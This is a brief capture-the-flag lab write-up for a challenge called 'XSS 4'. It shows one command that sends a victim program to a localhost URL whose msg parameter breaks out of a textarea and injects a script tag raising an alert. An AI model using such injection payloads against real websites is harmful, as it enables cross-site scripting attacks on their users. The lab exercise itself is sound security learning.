# XSS 4

#### Just need to wrap a <script> in a text area:
```
/challenge/victim "http://challenge.localhost?msg=</textarea><script>alert(\"PWNED
\")</script></textarea>"
```
